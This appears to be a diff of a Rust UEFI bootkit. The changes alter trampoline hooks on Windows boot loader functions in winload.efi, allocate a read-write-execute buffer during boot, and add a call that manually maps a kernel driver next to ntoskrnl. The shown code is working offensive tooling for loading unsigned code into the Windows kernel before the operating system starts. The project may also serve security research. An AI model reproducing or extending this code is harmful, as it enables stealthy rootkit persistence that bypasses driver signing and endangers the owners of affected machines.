@@ -3,8 +3,9 @@ use core::{slice::from_raw_parts};
 use uefi::{prelude::BootServices};
 use uefi::proto::loaded_image::LoadedImage;
 use uefi::{Handle, Status};
-use crate::boot::globals::{DRIVER_ADDRESS, DRIVER_LENGTH};
+use crate::boot::globals::{ALLOCATED_BUFFER, DRIVER_IMAGE_SIZE};
 use crate::boot::pe::{pattern_scan, trampoline_hook64, trampoline_unhook, get_loaded_module_by_hash};
+use crate::mapper::manually_map;
 use super::{includes::_LOADER_PARAMETER_BLOCK};
 
 extern crate alloc;
@@ -15,8 +16,9 @@ type ImgArchStartBootApplicationType = fn(app_entry: *mut u8, image_base: *mut u
 #[allow(non_upper_case_globals)]
 static mut ImgArchStartBootApplication: Option<ImgArchStartBootApplicationType> = None;
 
+// Thanks jonaslyk for providing the correct function signature for BlImgAllocateImageBuffer :)
 #[allow(non_camel_case_types)]
-type BlImgAllocateImageBufferType = fn(image_buffer: &mut *mut c_void, image_size: usize, memory_type: u32, attributes: u32, unused: *mut c_void, flags: u32) -> uefi::Status;
+type BlImgAllocateImageBufferType = fn(image_buffer: *mut *mut c_void, image_size: u64, memory_type: u32, preffered_attributes: u32, preferred_alignment: u32, flags: u32) -> uefi::Status;
 
 #[allow(non_upper_case_globals)]
 static mut BlImgAllocateImageBuffer: Option<BlImgAllocateImageBufferType> = None;
@@ -129,25 +131,23 @@ pub fn img_arch_start_boot_application_hook(_app_entry: *mut u8, image_base: *mu
     unsafe { ImgArchStartBootApplication.unwrap()(_app_entry, image_base, image_size, _boot_option, _return_arguments) };
 }
 
+// Thanks jonaslyk for providing the correct function signature for BlImgAllocateImageBuffer :)
 /// This is called by the Windows OS loader (winload.efi) to allocate image buffers and we can use it to allocate memory for the Windows kernel driver
-fn bl_img_allocate_image_buffer_hook(image_buffer: &mut *mut c_void, image_size: usize, memory_type: u32, attributes: u32, unused: *mut c_void, flags: u32) -> uefi::Status {
+fn bl_img_allocate_image_buffer_hook(image_buffer: *mut *mut c_void, image_size: u64, memory_type: u32, preffered_attributes: u32, preferred_alignment: u32, flags: u32) -> uefi::Status {
     // Unhook BlImgAllocateImageBuffer and restore stolen bytes before we do anything else
     unsafe { trampoline_unhook(BlImgAllocateImageBuffer.unwrap() as *mut () as *mut u8,ORIGINAL_BYTES_COPY.as_mut_ptr(),JMP_SIZE) };
 
     log::info!("[+] BlImgAllocateImageBuffer Hook called!");
 
     // Call the original unhooked BlImgAllocateImageBuffer function
-    let status = unsafe { BlImgAllocateImageBuffer.unwrap()(image_buffer, image_size, memory_type, attributes, unused, flags) };
-    log::info!("First BlImgAllocateImageBuffer returned: {:?}!", status);
-    log::info!("Windows kernel driver loaded at: {:p}", image_buffer);
+    let status = unsafe { BlImgAllocateImageBuffer.unwrap()(image_buffer, image_size, memory_type, preffered_attributes, preferred_alignment, flags) };
 
     if status == Status::SUCCESS && memory_type == BL_MEMORY_TYPE_APPLICATION {
         // Allocate memory for the driver
-        let status = unsafe { BlImgAllocateImageBuffer.unwrap()(&mut (&mut DRIVER_ADDRESS as *mut u64 as *mut c_void), DRIVER_LENGTH as _, memory_type, BL_MEMORY_ATTRIBUTE_RWX, unused, 0) };
+        let status = unsafe { BlImgAllocateImageBuffer.unwrap()(&mut ALLOCATED_BUFFER as *mut *mut c_void, DRIVER_IMAGE_SIZE, memory_type, BL_MEMORY_ATTRIBUTE_RWX, preferred_alignment, 0) };
         
         log::info!("Second BlImgAllocateImageBuffer returned: {:?}!", status);
-        log::info!("Driver Address: {:#x}", unsafe { DRIVER_ADDRESS as u64 });
-        log::info!("Driver Length: {:#x}", unsafe { DRIVER_LENGTH as u64 });
+        log::info!("Driver Address: {:#x}", unsafe { ALLOCATED_BUFFER as u64 });
 
         // This time we don't hook BlImgAllocateImageBuffer again
         return status;
@@ -177,7 +177,15 @@ fn ols_fwp_kernel_setup_phase1_hook(loader_block: *mut _LOADER_PARAMETER_BLOCK) 
 
     log::info!("ntoskrnl.exe image base: {:p}", unsafe { (*ntoskrnl_entry).DllBase });
     log::info!("ntoskrnl.exe image size: {:#x}", unsafe { (*ntoskrnl_entry).SizeOfImage });
-    
+
+    // The target module is the driver we are going to hook, this will be left to the user to change TODO
+    /* 
+    let target = unsafe { get_loaded_module_by_hash(&mut (*loader_block).LoadOrderListHead,0x1337)
+        .expect("Failed to get loaded module by name")
+    };
+    */
+
+    unsafe { manually_map((*ntoskrnl_entry).DllBase as _) };
     
     /* The commented code is not required, if you're hooking OslFwpKernelSetupPhase1
     
